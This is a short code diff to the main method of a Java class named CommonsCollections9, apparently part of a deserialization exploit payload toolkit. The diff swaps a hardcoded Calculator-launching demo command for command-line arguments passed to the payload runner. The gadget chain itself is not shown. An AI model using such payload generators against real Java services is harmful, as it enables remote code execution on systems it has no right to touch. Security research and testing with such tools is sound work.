@@ -90,9 +90,7 @@ public class CommonsCollections9 extends PayloadRunner implements ObjectPayload<
     }
 
     public static void main(final String[] args) throws Exception {
-        String[] cmd = new String[] {"/Applications/Calculator.app/Contents/MacOS/Calculator"};
-        PayloadRunner.runDeserialize = true;
-        PayloadRunner.run(CommonsCollections9.class, cmd);
+        PayloadRunner.run(CommonsCollections9.class, args);
     }
 
     public static boolean isApplicableJavaVersion() {
